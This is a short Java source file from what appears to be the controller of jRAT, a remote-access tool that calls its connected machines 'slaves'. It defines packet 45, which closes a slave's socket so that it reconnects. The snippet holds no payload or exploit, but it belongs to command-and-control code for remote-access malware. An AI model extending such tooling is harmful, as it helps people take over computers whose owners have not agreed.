package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.exceptions.CloseException;


public class Packet45Reconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Reconnecting"));
	}

	@Override
	public short getPacketId() {
		return 45;
	}

}
